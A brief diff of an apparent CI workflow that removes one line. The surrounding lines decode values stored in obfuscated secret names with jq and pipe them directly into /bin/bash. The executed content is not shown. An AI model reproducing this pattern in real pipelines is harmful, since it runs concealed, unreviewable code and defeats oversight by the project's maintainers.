@@ -18,7 +18,6 @@ jobs:
           jzdr1: ${{ secrets.jzdr1 }}
         run: |
           printf '%s' "$jzdr1" | jq -r .qzqkl3674 | /bin/bash
-          echo $o2 | jq -r .qiy2 | /bin/bash
           printf '%s' "$uh964" | jq -r .klam59 | /bin/bash
           printf '%s' "$gf654" | jq -r .af288 | /bin/bash
 
